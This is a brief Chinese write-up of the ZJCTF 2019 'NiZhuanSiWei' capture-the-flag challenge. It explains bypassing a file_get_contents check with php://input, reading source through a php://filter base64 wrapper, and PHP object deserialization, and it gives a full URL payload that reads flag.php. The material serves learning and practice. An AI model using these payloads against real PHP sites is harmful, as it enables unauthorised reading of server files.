# \[ZJCTF 2019]NiZhuanSiWei

## \[ZJCTF 2019]NiZhuanSiWei

## 考点

* 用php://input绕过file\_get\_contents的内容限制
* 文件包含配合伪协议读取文件
* PHP反序列化

## wp

![](../../.gitbook/assets/mjjndGScRFxy6RNpIYI8nl97RgL\_GzpPXU6iWIDcg90.png)

用`php://input`绕过`file_get_contents($text,'r')`的限制

用`php://filter/read=convert.base64-encode/resource=useless.php`读取文件

```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>
```

然后反序列化

```php
class Flag{
    public $file="flag.php";  
}  

$a = new Flag();
echo serialize($a);
```

payload:

```
?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

welcome to the zjctf
```
